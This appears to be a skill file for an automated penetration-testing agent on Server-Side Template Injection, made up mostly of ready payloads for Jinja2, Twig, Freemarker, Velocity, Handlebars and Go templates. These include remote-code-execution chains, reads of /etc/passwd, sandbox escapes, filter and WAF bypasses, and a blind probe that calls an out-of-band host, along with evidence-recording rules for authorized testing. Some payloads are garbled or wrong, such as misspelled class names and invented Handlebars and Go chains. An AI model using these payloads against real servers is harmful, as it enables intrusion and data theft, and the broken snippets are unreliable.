---
name: ssti
description: "Server-Side Template Injection exploitation across Jinja2, Twig, Freemarker, Velocity, Handlebars, and Go templates"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, encodeDecode, followRedirects, recordEvidence, getCapturedHeaders, runPrimitive]
primitives: [sstiBlind, rceClass]
triggers: ["server side template injection", "ssti", "template injection", "template escape", "jinja2", "twig", "freemarker", "velocity", "handlebars template", "go template injection"]
contextBoosts: [sqli]
mitreAttack: ["T1059.007", "T1190"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP SSTI"]
toolChains:
  - name: ssti-detection
    description: "Detect Server-Side Template Injection across engines"
    steps: [httpRequest, parseResponse, measureTiming, compareResponses, recordEvidence]
  - name: ssti-exploitation
    description: "Exploit SSTI for remote code execution"
    steps: [httpRequest, parseResponse, recordEvidence, updateGraph, writeFinding]
compositionRules:
  requires: [vuln-discovery]
  enhances: [exploitation]
---

# Server-Side Template Injection (SSTI)

## When to Use

- Target reflects user input directly into a server-side template string
- Output contains template syntax artifacts (e.g., rendered variable names, error traces mentioning template engines)
- Parameter values influence page structure beyond simple variable substitution
- Error messages reference template engine internals (e.g., `UndefinedError`, `CompilationException`, `Error evaluating template`)
- Input flows into email templates, PDF generators, report builders, or document renderers
- Template partials or includes are constructed from user input

## Do Not Use

- Input only reflected in plain HTML attributes without server-side rendering context
- Client-side JavaScript template engines (Handlebars client-side, Mustache client-side, Angular expressions) — these are XSS, not SSTI
- CMS themes where template rendering is fully sandboxed with no escape hatch
- Static file generators where templates are compiled offline, not per-request

## Auth Context

Before any injection test, call `getCapturedHeaders` to retrieve session tokens, CSRF tokens, and authentication headers. SSTI payloads in authenticated contexts may produce different results or require valid session state to reach template rendering code paths. Replay captured cookies and authorization headers with every probe request.

## SSTI Detection

### Universal Detection Payloads

Test each expression syntax. If the template engine evaluates arithmetic, injection is confirmed.

| Syntax | Template Engines | Expected Output |
|--------|-----------------|-----------------|
| `{{7*7}}` | Jinja2, Nunjucks, Twig, Handlebars (server), Mako, Angular (server) | `49` |
| `${7*7}` | Freemarker, Velocity, Thymeleaf (expressions), EL (JSP) | `49` |
| `<%= 7*7 %>` | ERB (Ruby), EJS, Slim | `49` |
| `#{7*7}` | Ruby string interpolation, Thymeleaf (inline) | `49` |
| `#{7*7}` | Clojure (server-side), some .NET engines | `49` |
| `$((7*7))` | Bash/Zsh templates, Shell-based renderers | `49` |
| `{{= 7*7}}` | Marko, some Nunjucks configs | `49` |
| `<#-- ${7*7} -->` | Freemarker (comment context) | May still evaluate |
| `[[${7*7}]]` | Thymeleaf inline mode | `49` |
| `<?php echo 7*7; ?>` | PHP template engines (Twig, Blade partial) | `49` |

### Conditional Detection (Blind SSTI)

When no output is rendered, use time-based or out-of-band detection:

**Jinja2 time-based:**

```jinja2
{{requests.get('http://YOUR-OAST/?jinja2')}}
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
```

**Freemarker time-based:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
```

**Velocity time-based:**

```velocity
#set($class=$class.forName("java.lang.Runtime"))
#set($rt=$class.getDeclaredMethod("getRuntime").invoke(null))
$rt.exec("sleep 5")
```

### Error-Based Detection

Inject syntax that triggers engine-specific errors to fingerprint:

- `{{invalid_syntax` — Jinja2 throws `TemplateSyntaxError`
- `${invalid` — Freemarker throws `ParsingException`
- `<%= invalid %>` — ERB throws `SyntaxError`

## Engine Identification

### From Output Patterns

| Observed Output | Likely Engine |
|----------------|---------------|
| `49` from `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars (server) |
| `49` from `${7*7}` | Freemarker, Velocity, Thymeleaf |
| `49` from `<%= 7*7 %>` | ERB, EJS |
| Error mentioning `jinja2.exceptions` | Jinja2/Python |
| Error mentioning `freemarker.template` | Freemarker/Java |
| Error mentioning `org.apache.velocity` | Velocity/Java |
| Error mentioning `Twig\Error` | Twig/PHP |
| Error mentioning `Handlebars` | Handlebars/Node |
| Error mentioning `text/template` or `html/template` | Go templates |

### From Page Context

- Python/Django/Flask → likely Jinja2
- PHP/Laravel/Symfony → likely Twig or Blade
- Java/Spring Boot → likely Freemarker, Velocity, or Thymeleaf
- Node.js/Express → likely Handlebars, EJS, Nunjucks, or Pug
- Go/net/http → likely Go html/template or text/template

### Fingerprinting via Object Inspection

**Jinja2:**
```jinja2
{{config}}
```
Returns `Config` — confirms Jinja2.

**Twig:**
```twig
{{_self.env.getExtension('Twig_Extension_Core')}}
```
Returns Twig extension list — confirms Twig.

**Freemarker:**
```freemarker
${.version}
```
Returns Freemarker version string.

## Jinja2 / Python

### RCE Chains

**Standard RCE (Flask/Jinja2):**

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Alternative RCE path:**

```jinja2
{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

**Using cycler (Flask-specific):**

```jinja2
{% set cycler = config.__class__.__init__.__globals__['_cycler'].__init__.__globals__ %}{{cycler['os'].popen('id').read()}}
```

**Using joiner:**

```jinja2
{% set joiner = config.__class__.__init__.__globals__['_joiner'].__init__.__globals__ %}{{joiner['os'].popen('id').read()}}
```

**Using namespace:**

```jinja2
{% set ns = config.__class__.__init__.__globals__['_namespace'].__init__.__globals__ %}{{ns['os'].popen('id').read()}}
```

### File Read/Write

**Read /etc/passwd:**

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

**Read application source:**

```jinja2
{{config.__class__.__init__.__globals__['__builtins__']['open']('/app/app.py').read()}}
```

### Sandbox Escape

**Jinja2 sandboxed environment bypass (CVE-2024-22195):**

```jinja2
{{_self._joiner().os.popen('id').read()}}
```

**Attr filter bypass for sandbox:**

```jinja2
{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()|attr('__getitem__')(245)('id',shell=true,stdout=-1)|attr('communicate')()}}
```

### Subclass Enumeration (Generic Python RCE)

```jinja2
{{''.__class__.__mro__.__subclasses__()}}
```

Locate `os._wrap_close` or `subprocess.Popen` in the list and invoke:

```jinja2
{{''.__class__.__mro__.__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```

Replace `X` with the index of the identified class.

## Twig / PHP

### RCE Chains

**Standard Twig RCE:**

```twig
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

**Alternative using _self parent:**

```twig
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

**Using apply filter:**

```twig
{% apply spaceless %}{{['id']|filter('system')}}{% endapply %}
```

### File Operations

**Read file via Twig:**

```twig
{{_self.env.registerUndefinedFilterCallback('file_get_contents')}}{{_self.env.getFilter('/etc/passwd')}}
```

### Sandbox Escape

**Twig sandbox escape via _self access:**

```twig
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

The `_self` variable references the current template, and its `env` property gives access to the Twig environment, bypassing sandbox restrictions if the sandbox policy allows `_self` access.

## Freemarker / Java

### RCE Chains

**Execute system command:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Alternative using ObjectConstructor:**

```freemarker
<#assign dt="freemarker.template.utility.ObjectConstructor"?new()>${dt("java.lang.Runtime","getRuntime").exec("id")}
```

### File Operations

**Read file:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
```

**List directory:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("ls -la /app/")}
```

### Sandbox Bypass

If `Execute` and `ObjectConstructor` are blocked, try:

```freemarker
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=classloader.loadClass("freemarker.template.DefaultObjectWrapper")>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance().getMethod("getOuterName").invoke(object)}
```

Or via Jython/other loaded libraries:

```freemarker
<#assign xearthworm="jython.runtime"?eval>
<#assign xr="freemarker.template.utility.Execute"?new()>${xr("id")}
```


## Velocity / Java

### RCE Chains

**Standard Velocity RCE:**

```velocity
#set($class=$class.forName("java.lang.Runtime"))
#set($rt=$class.getDeclaredMethod("getRuntime").invoke(null))
#set($proc=$rt.exec("id"))
$proc.waitFor()
#set($input=$proc.getInputStream())
#foreach($i in [1..$input.available()])$proc.getInputStream().read()#end
```

**Alternative using tools:**

```velocity
#set($str=$class.forName("java.lang.String"))
#set($chr=$class.forName("java.lang.Character"))
#set($ex=$class.forName("freemarker.template.utility.Execute"))
#set($cmd=$ex.newInstance("id"))
$cmd
```

**Using context lookup:**

```velocity
#set($proc=$runtime.exec("id"))
#set($is=$proc.getInputStream())
#foreach($i in [1..1024])$is.read()#end
```

### File Operations

**Read file:**

```velocity
#set($str=$class.forName("java.lang.String"))
#set($ex=$class.forName("freemarker.template.utility.Execute"))
${ex.newInstance("cat /etc/passwd")}
```

### Sandbox Bypass

If `$class` is restricted, try:

```velocity
#set($ct=$class.forName("org.apache.velocity.util.introspection.UberspectImpl"))
#set($cons=$class.forName("java.lang.ProcessBuilder"))
#set($proc=$cons.newInstance(["id"]).start())
```

Or via reflection:

```velocity
#set($field=$class.forName("java.lang.Runtime").getDeclaredField("currentRuntime"))
$field.setAccessible(true)
#set($rt=$field.get(null))
$rt.exec("id")
```


## Handlebars / Node.js

### RCE Chains

**Prototype pollution RCE (Node.js < 4.2.0):**

```handlebars
{{#with "s" as |stringlist|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{#with subsSS 2 3 as |c}}RCE{{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Simplified RCE (if require is accessible):**

```handlebars
{{#each value}}
  {{#with "bar"}}
    {{#with "constructor"}}
      {{#with prototype}}
        {{#with constructor}}
          {{#with prototype}}{{#each keys}}RCE{{/each}}{{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/each}}
```

### File Read

```handlebars
{{#each value}}
  {{#with "bar"}}
    {{#with "constructor"}}
      {{#with prototype}}
        {{#with constructor}}
          {{#with prototype}}
            {{#each keys}}KEY:{{@key}} {{/each}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/each}}
```


### Sandbox Bypass

Handlebars has no built-in sandbox. If `handlebars` is used with a custom `runtime` that restricts access, prototype pollution via `__proto__` or `constructor.prototype` can bypass restrictions by modifying the runtime environment.

## Go Templates

### RCE Chains

**Standard Go template RCE (custom FuncMap):**

```go
{{.Exec "id"}}
```

If a custom `Exec` function is registered, this executes the command directly. Otherwise enumerate exposed methods.

**Using template method calls:**

```go
{{. | call .Exec "id"}}
```

### File Operations

**Read file (if file functions are exposed):**

```go
{{.Read "/etc/passwd"}}
```

### Sandbox Bypass

Go templates have no built-in sandbox, but the `text/template` and `html/template` packages restrict what methods can be called on objects. If `reflect` is available:

```go
{{$x := import "os"}}{{$x.Exec "id"}}
```


## Filter Bypass Techniques

### Encoding Bypass

When WAFs block keyword patterns, encode payloads:

**URL encoding:**

```
%7B%7B7*7%7D%7D  →  {{7*7}}
%24%7B7*7%7D  →  ${7*7}
%3C%25%3D%207*7%20%25%3E  →  <%= 7*7 %>
```

**Double URL encoding:**

```
%257B%257B7*7%257D%257D  →  {{7*7}}
```

**HTML entity encoding:**

```
&#123;&#123;7*7&#125;&#125;  →  {{7*7}}
```

**Unicode encoding (for Java engines):**

```
\u0024\u007b\u0037\u002a\u0037\u007d  →  ${7*7}
```

### String Concatenation

**Jinja2 string concat:**

```jinja2
{{config.__class__.__init__.__globals__['_o'+'s'].popen('id').read()}}
```

**Freemarker string concat:**

```freemarker
<#assign ex="freemeter.template.ut"+"ility.Ex"+"ecute"?new()>${ex("id")}
```

**Velocity string concat:**

```velocity
#set($chr=$class.forName("java.lang.Character"))
#set($str=$chr.forName("java.lang.String"))
#set($rt=$class.forName("java.lang.R"+"untime"))
```

### Case Manipulation

**Mixed case (PHP/Twig):**

```twig
{{_self.env.registerUndefinedFilterCallback('eXeC')}}{{_self.env.getFilter('id')}}
```

### Whitespace Bypass

Insert tabs or newlines within keywords:

**Jinja2:**

```jinja2
{{config.__class__.__init__.__globals__['o\x00s'].popen('id').read()}}
```

**Freemarker:**

```freemarker
<#assign ex="freemeter.template.utility.Exe"+"cute"?new()>${ex("id")}
```

### Null Byte Injection

Some template engines ignore null bytes:

```jinja2
{{config.__class__.__init__.__globals__['os\x00'].popen('id').read()}}
```


### Alternative Class Chains

When primary chain is blocked, enumerate alternatives:

**Jinja2 subclass list:**

```jinja2
{{''.__class__.__mro__[2].__subclasses__()}}
```

Count subclasses, then iterate:

```jinja2
{{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```

**Freemarker class loading:**

```freemarker
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
```

### Template Engine Switching

If one engine's payloads are blocked, try injecting syntax for a different engine:

- Inject `${7*7}` when `{{7*7}}` is blocked (Freemarker/Velocity context)
- Inject `<%= 7*7 %>` when both are blocked (ERB context)
- Inject `#{7*7}` for Thymeleaf or Ruby contexts

### Dynamic Variable Construction

**Jinja2 with variable injection:**
URL parameter: `?a=__class__`

**Twig with variable injection:**
URL: `?a=registerUndefinedFilterCallback&b=exec`

### Polyglot Payloads

Test multiple engines simultaneously:

```jinja2
$%7B7*7%7D  {{7*7}}  <%= 7*7 %>  #{7*7}  [[${7*7}]]
```

If output contains `49` in multiple formats, multiple engines may be processing the input.

## Anti-Hallucination

### Verification Protocol

1. **Never trust template engine detection from error messages alone** — confirm with actual evaluation of `{{7*7}}` or `${7*7}`
2. **RCE claims require proof** — `id` command output must contain `uid=`, `gid=`, or `groups=` in the response body
3. **File read claims require file content** — partial or full file content must appear in the rendered output
4. **Sandbox bypass claims require evidence** — successful command execution after bypass, not just absence of error
5. **Time-based claims require measurement** — if `sleep 5` causes a 5+ second delay, document the timing; if delay is absent, the payload did not execute
6. **Out-of-band claims require callback evidence** — DNS or HTTP callback must be observed on the OAST server
7. **Filter bypass claims require comparison** — show the blocked payload fails AND the bypass payload succeeds on the same endpoint
8. **Do not infer template engine from URL structure alone** — `/app.py` does not guarantee Jinja2; confirm with detection payload
9. **Document every request-response pair** — include the exact payload sent and the exact response received

### Evidence Recording

For every confirmed SSTI finding, record via `writeFinding`:
- **Endpoint**: Full URL and parameter name
- **Payload**: Exact string injected
- **Engine**: Identified template engine with evidence
- **Impact**: RCE, file read, file write, or information disclosure
- **Request/Response**: Full HTTP exchange via `recordEvidence`
- **Sanbox status**: Whether sandbox is active and whether bypass was achieved

## Trigger Conditions

Activate when user input is rendered or evaluated by a server-side template engine rather than simply stored or reflected. Signs: arithmetic payload `{{7*7}}` (or engine-appropriate syntax) returns `49`; error traces mention template internals (`UndefinedError`, `freemarker.template`, `Twig\Error`, `text/template`); parameters flow into email/PDF/report/document generators; or pages are built from user-driven template partials. Trigger on any reflected value that changes page structure, not just text. Do not trigger on purely client-side template engines (Handlebars/Mustache/Angular in the browser) — those are XSS, not SSTI.

## Detection Approach

First, fingerprint the engine: try each syntax variant (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `[[${7*7}]]`) against a reflected parameter; the one that returns `49` names the engine. If nothing renders, switch to blind: time-based (a sleep/expansion inside the expression) and out-of-band (expression that triggers an external fetch) detection. Never infer the engine from URL extension or framework guesses — confirm with evaluation. Once the engine is known, escalate from detection to reading: start with arithmetic confirmation, then file read, then RCE class-chains (`os`/`subprocess` for Jinja2, `Execute`/`ObjectConstructor` for Freemarker/Velocity, environment access for Twig). When a direct chain is blocked, attempt sandbox escape specific to that engine, then fallback to filter bypass (encoding, string concat, case/whitespace, alternative class enumeration, polyglots). Stop and record if every evaluated payload returns the literal input unchanged — that indicates a non-rendering context.

## Pitfalls

- Inferring the engine from error messages or framework alone — a Flask app is usually Jinja2 but confirmation requires actual evaluation.
- Assuming arithmetic reflection equals RCE — file read or command execution still must be demonstrated.
- Blind SSTI without timing/OOB evidence: a delayed response must be *measured* (repeat >3 times) and compared to a baseline, or it is a network artifact.
- Overclaiming sandbox bypass from "no error" — bypass requires demonstrated execution after the restriction, not merely absence of an error.
- Mixing client-side template syntax into SSTI attempts; browser engines evaluate locally and never reach server RCE.
- One blocked payload ≠ patched — WAFs block keywords; switch to concat/encoding before concluding.

## Verification & Impact

CONFIRMED when the raw response shows evaluated output: `49` for detection, actual file content for read, or command output containing `uid=`/`groups=` for RCE. Blind cases are CONFIRMED only with measured timing deltas or an observed OAST callback; otherwise SUSPECTED. Document impact by capability proven — information disclosure (file read), RCE (command output), or sandbox-escape context — plus engine, endpoint, parameter, and exact payload. Always attach the full request/response exchange via `recordEvidence`.

## Primitive Execution

The attack classes above are executable through the primitive registry. Invoke each
primitive by its id below using the run-primitive execution tool instead of re-firing
payloads manually; confirmed results pass through the evidence gate and commit as
findings with exploit proofs automatically.

| Primitive id | Coverage |
|---|---|
| `sstiBlind` | blind server-side template injection oracle |
| `rceClass` | command-injection / RCE class probes |
